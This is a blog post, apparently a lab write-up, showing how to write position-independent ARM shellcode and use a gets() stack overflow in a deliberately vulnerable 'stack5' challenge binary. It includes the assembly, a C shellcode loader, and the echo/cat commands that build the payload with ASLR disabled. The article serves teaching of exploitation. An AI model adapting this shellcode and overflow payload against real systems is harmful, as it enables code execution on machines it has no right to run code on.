<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Smashing ARM Stack for Fun - Part VI</title>
  <meta name="description" content="We have the same vulnerability than we have instack4but this time we will make our own egg/shellcode.">

  
    <link href='//fonts.googleapis.com/css?family=Lato:400,400italic' rel='stylesheet' type='text/css'>
  

  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        extensions: ["tex2jax.js"],
        jax: ["input/TeX","output/HTML-CSS"],
        tex2jax: {inlineMath: [["$$","$$"],["\\(","\\)"]]},
	TeX: {
	  Macros: {
            
	  }
	}
      });
    </script>
    
      <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js' async></script>
    
  

  
    <script
       src="https://code.jquery.com/jquery-3.4.1.min.js"
       integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
       crossorigin="anonymous"></script>
  

  

    
      <script src='https://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.9.1/underscore-min.js' ></script>
    

    
      <script src="https://d3js.org/d3.v4.min.js"></script>
    

    <script src='/book-of-gehn/js/venn/venn.min.js'></script>
    <script src='/book-of-gehn/js/venn/helper.js'></script>

    <script src='/book-of-gehn/js/fix_syntax_highlight.js'></script>
  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/tufte.css">
  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/latex.css">

  <link rel="canonical" href="/book-of-gehn/articles/2021/01/26/Smashing-ARM-Stack-for-Fun-Part-VI.html">

  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/all.min.css">

  <link type="application/atom+xml" rel="alternate" href="/book-of-gehn/feed.xml" title="The Book of Gehn" />
</head>

  <body>
    <header>
	
		<h1 class="header-title"><a href="/book-of-gehn/">The Book of Gehn</a></h1>
		
		
	

    

    
</header>

    <article class="group">
      <h1>Smashing ARM Stack for Fun - Part VI</h1>
<p class="subtitle">January 26, 2021</p>

<p>We have the same vulnerability than we have in
<a href="/book-of-gehn/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-V.html">stack4</a>
but this time we will make our own egg/shellcode.<!--more--></p>

<h2 id="same-vuln">Same vuln</h2>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">pdisass</span> <span class="o">&amp;</span><span class="n">main</span>
 <span class="err">►</span> <span class="mh">0x1041c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">&gt;</span>       <span class="k">push</span>   <span class="err">{</span><span class="n">fp</span><span class="p">,</span> <span class="n">lr</span><span class="err">}</span>
   <span class="mh">0x10420</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;</span>     <span class="k">add</span>    <span class="n">fp</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="err">#</span><span class="mi">4</span>
   <span class="mh">0x10424</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;</span>     <span class="k">sub</span>    <span class="n">sp</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x48</span>
   <span class="mh">0x10428</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">12</span><span class="o">&gt;</span>    <span class="k">str</span>    <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mh">0x48</span><span class="err">]</span>
   <span class="mh">0x1042c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span>    <span class="k">str</span>    <span class="n">r1</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mh">0x4c</span><span class="err">]</span>
   <span class="mh">0x10430</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;</span>    <span class="k">sub</span>    <span class="n">r3</span><span class="p">,</span> <span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x44</span>
   <span class="mh">0x10434</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">24</span><span class="o">&gt;</span>    <span class="k">mov</span>    <span class="n">r0</span><span class="p">,</span> <span class="n">r3</span>
   <span class="mh">0x10438</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">28</span><span class="o">&gt;</span>    <span class="n">bl</span>     <span class="err">#</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>

   <span class="mh">0x1043c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;</span>    <span class="k">mov</span>    <span class="n">r0</span><span class="p">,</span> <span class="n">r3</span>
   <span class="mh">0x10440</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">36</span><span class="o">&gt;</span>    <span class="k">sub</span>    <span class="n">sp</span><span class="p">,</span> <span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="mi">4</span>
   <span class="mh">0x10444</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">40</span><span class="o">&gt;</span>    <span class="k">pop</span>    <span class="err">{</span><span class="n">fp</span><span class="p">,</span> <span class="n">pc</span><span class="err">}</span>
</code></pre></div></div>

<p>The plan is to overflow the buffer with 0x44 bytes of padding, then 4
bytes with the first return address.</p>

<p>Nothing new. But the fun is just about to begin…</p>

<h2 id="planning-the-eggexploit">Planning the egg/exploit</h2>

<p>We want something standard but slightly fancy:</p>

<ul>
  <li>spawn a shell an run an arbitrary command</li>
  <li>wait for the spawned process to finish</li>
  <li>exit the program</li>
</ul>

<p>This translates to the following C code:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;unistd.h&gt;
</span><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">pid_t</span> <span class="n">child</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">child</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// child</span>
        <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"/bin/bash"</span><span class="p">,</span> <span class="s">"-c"</span><span class="p">,</span> <span class="s">"echo 'pwn!' &gt; pwned_proof"</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
        <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="nb">NULL</span> <span class="p">};</span>
        <span class="n">execve</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">child</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// parent</span>
        <span class="n">wait4</span><span class="p">(</span><span class="n">child</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">// catch all exit</span>
    <span class="n">exit_group</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The last <code class="highlighter-rouge">exit_group</code> is a catch all: if <code class="highlighter-rouge">fork</code> fails or <code class="highlighter-rouge">execve</code> fails
we want to have a deterministic output. The same for the parent process
after <code class="highlighter-rouge">wait4</code>.</p>

<h2 id="syscalls">Syscalls</h2>

<p><label for="mn-72ba81e919d274b14590783257f58039" class="margin-toggle"> ⊕</label><input type="checkbox" id="mn-72ba81e919d274b14590783257f58039" class="margin-toggle" /><span class="marginnote">References: <a href="https://syscalls.w3challs.com/?arch=arm_strong">w3challs</a>
and
<a href="https://github.com/torvalds/linux/blob/v4.17/arch/arm/tools/syscall.tbl">Linux kernel</a>
 </span></p>

<p>This is a summary of the syscalls’ numbers and arguments:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            r7      r0      r1      r2      r3
syscall     num     arg1    arg2    arg3    argv4
fork        0x02
execve      0x0b    "/bi.." argv    envp
wait4       0x72    pid     NULL    0       NULL
exit_group  0xf8    num
</code></pre></div></div>

<p><code class="highlighter-rouge">argv</code> and <code class="highlighter-rouge">envp</code>, are arrays of pointers with a
pointer to <code class="highlighter-rouge">NULL</code> marking the end of the array.</p>

<p>In Linux it is possible to pass a <code class="highlighter-rouge">NULL</code> instead an array with a single
pointer to <code class="highlighter-rouge">NULL</code>. This could be used for <code class="highlighter-rouge">envp</code>.</p>

<p>However:</p>

<blockquote>
  <p>On Linux, <code class="highlighter-rouge">argv</code> and <code class="highlighter-rouge">envp</code> can be specified as <code class="highlighter-rouge">NULL</code>.  In both cases,
this has the same effect as specifying  the  argument
as  a  pointer to a list containing a single null pointer.
<strong>Do not take advantage of this nonstandard and nonportable misfeature!</strong>
On many other UNIX systems, specifying <code class="highlighter-rouge">argv</code>
as NULL will result in an  error  (<code class="highlighter-rouge">EFAULT</code>). <em>Some</em>
other UNIX systems treat the <code class="highlighter-rouge">envp==NULL</code> case the same as Linux.
<cite class="epigraph"><a href="https://man7.org/linux/man-pages/man2/execve.2.html">man execve(2)</a></cite></p>
</blockquote>

<p>No problem! We can design a single array in the stack to fulfill both:</p>

<figure><figcaption><span></span></figcaption><object align="middle" data="/book-of-gehn/uml/ed64ad6ce4e7162edd7dbf8ce8e80e471c7ac9aa.svg" type="image/svg+xml"></object></figure>

<p>In assembly this translates to:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">mov</span> <span class="n">r3</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>              <span class="err">@</span><span class="c">; &amp;argv[3]</span>
    <span class="k">add</span> <span class="n">r2</span><span class="p">,</span> <span class="n">pc</span><span class="p">,</span> <span class="n">Largv2</span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="mi">8</span>
    <span class="k">add</span> <span class="n">r1</span><span class="p">,</span> <span class="n">pc</span><span class="p">,</span> <span class="n">Largv1</span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="mi">8</span>
    <span class="k">add</span> <span class="n">r0</span><span class="p">,</span> <span class="n">pc</span><span class="p">,</span> <span class="n">Largv0</span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="mi">8</span>  <span class="err">@</span><span class="c">; &amp;argv[0]</span>
    <span class="k">push</span> <span class="err">{</span><span class="n">r0</span><span class="o">-</span><span class="n">r3</span><span class="err">}</span>
</code></pre></div></div>

<p>But why <code class="highlighter-rouge">add</code> and not <code class="highlighter-rouge">mov</code>?</p>

<h2 id="position-independent-code">Position independent code</h2>

<p>The exploit will be loaded in a piece of executable memory but we cannot
know <em>a priori</em> where.</p>

<p>Therefore, branches and addresses <strong>must</strong> be <em>relative</em> to the program
counter.</p>

<p>We cannot just say <code class="highlighter-rouge">mov r2, label</code> as we will hardcoding the address of
<code class="highlighter-rouge">label</code>; we need to use <code class="highlighter-rouge">add</code> and <code class="highlighter-rouge">pc</code>.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">00000020</span> <span class="o">&lt;</span><span class="n">Lchild</span><span class="o">&gt;:</span>
  <span class="mi">20</span><span class="o">:</span>   <span class="n">e3a03000</span>        <span class="k">mov</span>     <span class="n">r3</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
  <span class="mi">24</span><span class="o">:</span>   <span class="n">e28f204c</span>        <span class="k">add</span>     <span class="n">r2</span><span class="p">,</span> <span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">76</span>     <span class="c">; 0x4c  argv2</span>
  <span class="mi">28</span><span class="o">:</span>   <span class="n">e28f1044</span>        <span class="k">add</span>     <span class="n">r1</span><span class="p">,</span> <span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">68</span>     <span class="c">; 0x44  argv1</span>
  <span class="mi">2</span><span class="n">c</span><span class="o">:</span>   <span class="n">e28f0034</span>        <span class="k">add</span>     <span class="n">r0</span><span class="p">,</span> <span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">52</span>     <span class="c">; 0x34  argv0</span>
  <span class="mi">30</span><span class="o">:</span>   <span class="n">e92d000f</span>        <span class="k">push</span>    <span class="err">{</span><span class="n">r0</span><span class="p">,</span> <span class="n">r1</span><span class="p">,</span> <span class="n">r2</span><span class="p">,</span> <span class="n">r3</span><span class="err">}</span>
  <span class="mi">34</span><span class="o">:</span>   <span class="n">e28d1000</span>        <span class="k">add</span>     <span class="n">r1</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
  <span class="mi">38</span><span class="o">:</span>   <span class="n">e28d200c</span>        <span class="k">add</span>     <span class="n">r2</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="err">#</span><span class="mi">12</span>
  <span class="mi">3</span><span class="n">c</span><span class="o">:</span>   <span class="n">e3a0700b</span>        <span class="k">mov</span>     <span class="n">r7</span><span class="p">,</span> <span class="err">#</span><span class="mi">11</span>
  <span class="mi">40</span><span class="o">:</span>   <span class="n">ef000000</span>        <span class="n">svc</span>     <span class="mh">0x00000000</span>
        <span class="p">....</span>            <span class="p">....</span>

<span class="mi">00000068</span> <span class="o">&lt;</span><span class="n">Largv0</span><span class="o">&gt;:</span>
        <span class="p">....</span>            <span class="p">....</span>
<span class="mi">00000074</span> <span class="o">&lt;</span><span class="n">Largv1</span><span class="o">&gt;:</span>
        <span class="p">....</span>            <span class="p">....</span>
<span class="mi">00000078</span> <span class="o">&lt;</span><span class="n">Largv2</span><span class="o">&gt;:</span>
</code></pre></div></div>

<p>The <code class="highlighter-rouge">add</code> instructions like <code class="highlighter-rouge">add r2, pc, #76</code> makes the address relative
to the program counter.</p>

<p>To calculate the offset to a label like <code class="highlighter-rouge">Largv0</code> we need to subtract
the address of the label minus the current position minus 8 bytes
(because <code class="highlighter-rouge">pc</code> already has an implicit +0x8)</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="mh">0x78</span> <span class="o">-</span> <span class="mh">0x24</span> <span class="o">-</span> <span class="mh">0x8</span> <span class="o">=</span> <span class="mh">0x4c</span> <span class="o">=</span> <span class="mi">76</span>
</code></pre></div></div>

<p>Thankfully the assembler can do the calculus by us:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">add</span> <span class="n">r2</span><span class="p">,</span> <span class="n">pc</span><span class="p">,</span> <span class="n">Largv2</span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="mi">8</span>
</code></pre></div></div>

<p>And the branches?</p>

<p><code class="highlighter-rouge">bne Lparent_or_error</code> is a <em>PC-relative</em> encoded jump: the program will jump
to that <em>absolute</em> address but the instruction is encoded as an <em>offset</em>
from the current <code class="highlighter-rouge">pc</code>.</p>

<p>In other words, we are <strong>not</strong> hardcoding a fixed address so our code
will work regardless of where is going to be loaded.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">00000000</span> <span class="o">&lt;</span><span class="n">egg</span><span class="o">&gt;:</span>
   <span class="mi">0</span><span class="o">:</span>   <span class="n">e3a07002</span>        <span class="k">mov</span>     <span class="n">r7</span><span class="p">,</span> <span class="err">#</span><span class="mi">2</span>
   <span class="mi">4</span><span class="o">:</span>   <span class="n">ef000000</span>        <span class="n">svc</span>     <span class="mh">0x00000000</span>
   <span class="mi">8</span><span class="o">:</span>   <span class="n">e3500000</span>        <span class="k">cmp</span>     <span class="n">r0</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
   <span class="n">c</span><span class="o">:</span>   <span class="mi">1</span><span class="n">a000000</span>        <span class="n">bne</span>     <span class="mi">14</span> <span class="o">&lt;</span><span class="n">Lparent_or_error</span><span class="o">&gt;</span>
  <span class="mi">10</span><span class="o">:</span>   <span class="n">ea000002</span>        <span class="n">b</span>       <span class="mi">20</span> <span class="o">&lt;</span><span class="n">Lchild</span><span class="o">&gt;</span>
        <span class="p">....</span>            <span class="p">....</span>
<span class="mi">00000020</span> <span class="o">&lt;</span><span class="n">Lchild</span><span class="o">&gt;:</span>
  <span class="mi">20</span><span class="o">:</span>   <span class="n">e3a03000</span>        <span class="k">mov</span>     <span class="n">r3</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
</code></pre></div></div>

<p>The address is computed as:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">pc</span> <span class="o">+</span> <span class="n">offset</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">8</span>
</code></pre></div></div>

<p>The branch at 0x10 has the offset 0x02 encoded in the instruction
0xea000002. Knowing that the offset is multiplied by 4 (because the
addresses are aligned to 4 bytes; 2 in Thumb mode),
and knowing that using <code class="highlighter-rouge">pc</code> adds a 0x8 to the count
(0x4 in Thumb mode), the final address is:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="mh">0x10</span> <span class="o">+</span> <span class="mh">0x2</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mh">0x8</span> <span class="o">=</span> <span class="mh">0x20</span>
</code></pre></div></div>

<p>Why did I use <code class="highlighter-rouge">bne</code> instead of <code class="highlighter-rouge">beq</code> ? Wouldn’t that be more direct?</p>

<h2 id="forbidden-bytes">Forbidden bytes</h2>

<p>The vulnerable program will read our exploit using <code class="highlighter-rouge">gets</code>.</p>

<p>From the <a href="https://man7.org/linux/man-pages/man3/gets.3.html">man pages</a>,
<code class="highlighter-rouge">gets</code> reads from <code class="highlighter-rouge">stdin</code> until it finds a <em>termination character</em> or it
is the end of the stream.</p>

<p>In Linux, the new line (<code class="highlighter-rouge">\n</code> 0x0a) is the <em>termination character</em> so our
payload cannot have this byte or <code class="highlighter-rouge">gets</code> will stop in the middle of the copy.</p>

<p>For example the simple snippet is forbidden:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">cmp</span> <span class="n">r0</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
    <span class="n">beq</span> <span class="n">Lchild</span>
    <span class="err">@</span><span class="c">; code for parent or error follows</span>
</code></pre></div></div>

<p><label for="mn-328106b3fb06798d7bb537aa8abb437f" class="margin-toggle"> ⊕</label><input type="checkbox" id="mn-328106b3fb06798d7bb537aa8abb437f" class="margin-toggle" /><span class="marginnote">Bypassing the filters can be incredible complex. Here is article about
<a href="https://web.archive.org/web/2020*/http://www.phrack.org/issues/66/12.html">Alphanumeric RISC ARM Shellcode</a>.
 </span></p>

<p><code class="highlighter-rouge">beq</code> has a 0x0a as the first byte so we have to rewrite the snippet
to:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">cmp</span> <span class="n">r0</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
    <span class="n">bne</span> <span class="n">Lparent_or_error</span>
    <span class="n">b</span> <span class="n">Lchild</span>
</code></pre></div></div>

<h2 id="compilation">Compilation</h2>

<p>We compile the assembly into an object file with <code class="highlighter-rouge">gcc</code> (in a Raspbian)
and then we extract the <code class="highlighter-rouge">.text</code> section:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pi@raspberrypi:~<span class="nv">$ </span>gcc <span class="nt">-c</span> <span class="nt">-o</span> egg.o egg.s
pi@raspberrypi:~<span class="nv">$ </span>objcopy <span class="nt">-O</span> binary <span class="nt">--only-section</span><span class="o">=</span>.text egg.o egg.text
</code></pre></div></div>

<p>The assembly can be found <a href="/book-of-gehn/assets/azeria-arm-challenges-assets/egg.s">here</a>.</p>

<h2 id="testing">Testing</h2>

<p>It is always a good idea to test the shellcode <em>separately</em> from the
exploitation.</p>

<p>For this <a href="/book-of-gehn/assets/azeria-arm-challenges-assets/test-egg.c">we can create a small C program</a>
to load the <em>egg</em> from a file
into a buffer with <em>permission for execution</em> and then jump into it:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>

    <span class="n">posix_memalign</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="n">ALIGN</span><span class="p">,</span> <span class="n">fsize</span><span class="p">);</span>
    <span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fsize</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span>
    <span class="n">mprotect</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">fsize</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="o">|</span><span class="n">PROT_EXEC</span><span class="p">);</span>

    <span class="p">((</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">buf</span><span class="p">)();</span>
</code></pre></div></div>

<p>This is an example:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pi@raspberrypi:~<span class="nv">$ </span>./test-egg egg.text
Egg loaded at 0x24000-0x2409
</code></pre></div></div>

<p><label for="mn-7e40faf5a3bb8233e36e4d3e592de11d" class="margin-toggle"> ⊕</label><input type="checkbox" id="mn-7e40faf5a3bb8233e36e4d3e592de11d" class="margin-toggle" /><span class="marginnote">The <code class="highlighter-rouge">good</code> and <code class="highlighter-rouge">bad</code> labels were put by me. Sorry, <code class="highlighter-rouge">strace</code> is not so smart.
 </span></p>

<p>If the things don’t result as expected, <code class="highlighter-rouge">strace</code> can be useful to
inspect what syscalls are being called and with which parameters:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pi</span><span class="o">@</span><span class="n">raspberrypi</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">strace</span> <span class="o">-</span><span class="n">i</span> <span class="o">./</span><span class="n">test</span><span class="o">-</span><span class="n">egg</span> <span class="n">egg</span><span class="o">.</span><span class="n">text</span>
<span class="o">....</span>
<span class="n">strace</span><span class="p">:</span> <span class="n">Process</span> <span class="mi">4959</span> <span class="n">attached</span> <span class="o">&lt;---</span> <span class="n">child</span> <span class="n">process</span>
<span class="n">execve</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">,</span> <span class="p">[</span><span class="mh">0x6e69622f</span><span class="p">,</span> <span class="o">...</span><span class="p">,</span> <span class="mh">0x666f</span><span class="p">],</span> <span class="mh">0x2407f</span><span class="p">)</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="n">EFAULT</span> <span class="p">(</span><span class="n">Bad</span> <span class="n">address</span><span class="p">)</span>
           <span class="o">^</span>            <span class="o">^</span>
         <span class="n">good</span>          <span class="n">bad</span>
</code></pre></div></div>

<h2 id="search-a-home">Search a home</h2>

<p>Fortunately the stack is executable:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">vmmap</span>
   <span class="mh">0x10000</span>    <span class="mh">0x11000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>     <span class="mi">1000</span> <span class="mi">0</span>      <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">pi</span><span class="o">/</span><span class="n">stack5</span>
   <span class="mh">0x20000</span>    <span class="mh">0x21000</span> <span class="n">rwxp</span>     <span class="mi">1000</span> <span class="mi">0</span>      <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">pi</span><span class="o">/</span><span class="n">stack5</span>
<span class="mh">0xb6fcc000</span> <span class="mh">0xb6fec000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>    <span class="mi">20000</span> <span class="mi">0</span>      <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">arm</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnueabihf</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="mi">2</span><span class="p">.</span><span class="mi">28</span><span class="p">.</span><span class="n">so</span>
<span class="mh">0xb6ffc000</span> <span class="mh">0xb6ffe000</span> <span class="n">rwxp</span>     <span class="mi">2000</span> <span class="mi">20000</span>  <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">arm</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnueabihf</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="mi">2</span><span class="p">.</span><span class="mi">28</span><span class="p">.</span><span class="n">so</span>
<span class="mh">0xb6fff000</span> <span class="mh">0xb7000000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>     <span class="mi">1000</span> <span class="mi">0</span>      <span class="p">[sigpage]</span>
<span class="mh">0xbefdf000</span> <span class="mh">0xbf000000</span> <span class="n">rwxp</span>    <span class="mi">21000</span> <span class="mi">0</span>      <span class="p">[stack]</span>
<span class="mh">0xffff0000</span> <span class="mh">0xffff1000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>     <span class="mi">1000</span> <span class="mi">0</span>      <span class="p">[vectors]</span>
</code></pre></div></div>

<p>We can write the egg in the stack and then jump to it. The content
of the stack should be:</p>

<figure><figcaption><span></span></figcaption><object align="middle" data="/book-of-gehn/uml/b7f34862962704f7be1d7d121d78099f1c7ac9aa.svg" type="image/svg+xml"></object></figure>

<p><code class="highlighter-rouge">addr1</code> is <code class="highlighter-rouge">sp</code>. But what value is?</p>

<p>If we disable ASLR we can peek the value with a debugger: 0xbefffbb8</p>

<h2 id="the-attack">The attack</h2>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pi@raspberrypi:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s1">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb8\xfb\xff\xbe'</span> <span class="o">&gt;</span> exploit
pi@raspberrypi:~<span class="nv">$ </span><span class="nb">cat </span>egg.text <span class="o">&gt;&gt;</span> exploit

pi@raspberrypi:~<span class="nv">$ </span><span class="nb">rm</span> <span class="nt">-f</span> pwned_proof

pi@raspberrypi:~<span class="nv">$ </span>setarch linux32 <span class="nt">--addr-no-randomize</span> /bin/bash

<span class="o">(</span>aslr disabled<span class="o">)</span> pi@raspberrypi:~<span class="nv">$ </span><span class="nb">cat </span>exploit | ./stack5
<span class="o">(</span>aslr disabled<span class="o">)</span> pi@raspberrypi:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$?</span>
0

<span class="o">(</span>aslr disabled<span class="o">)</span> pi@raspberrypi:~<span class="nv">$ </span><span class="nb">cat </span>pwned_proof
pwn!
</code></pre></div></div>

<p>The assembly of the egg can be found <a href="/book-of-gehn/assets/azeria-arm-challenges-assets/egg.s">here</a>.</p>

<h2 id="readings">Readings</h2>

<ul>
  <li><a href="https://web.archive.org/web/2020*/http://www.phrack.org/issues/58/10.html#article">Developing StrongARM/Linux shellcode</a></li>
  <li><a href="https://azeria-labs.com/return-oriented-programming-arm32/">Introduction to ROP on Arm32</a></li>
  <li><a href="https://azeria-labs.com/writing-arm-shellcode/">Introduction to Writing ARM Shellcode</a></li>
</ul>




    </article>
    <span class="print-footer">Smashing ARM Stack for Fun - Part VI - January 26, 2021 - Gehn</span>
    <footer>
    <hr class="slender">
    <div class="credits">
        <span>&copy; 2021
            
            Gehn
        </span></br>
            <a style="text-decoration: none;" href="/book-of-gehn/feed.xml"><img height="16px" width="16px" src="/book-of-gehn/assets/blog-assets/rss-32px.png" /></a>
        <br>
        

    
    </div>
</footer>

  </body>
</html>
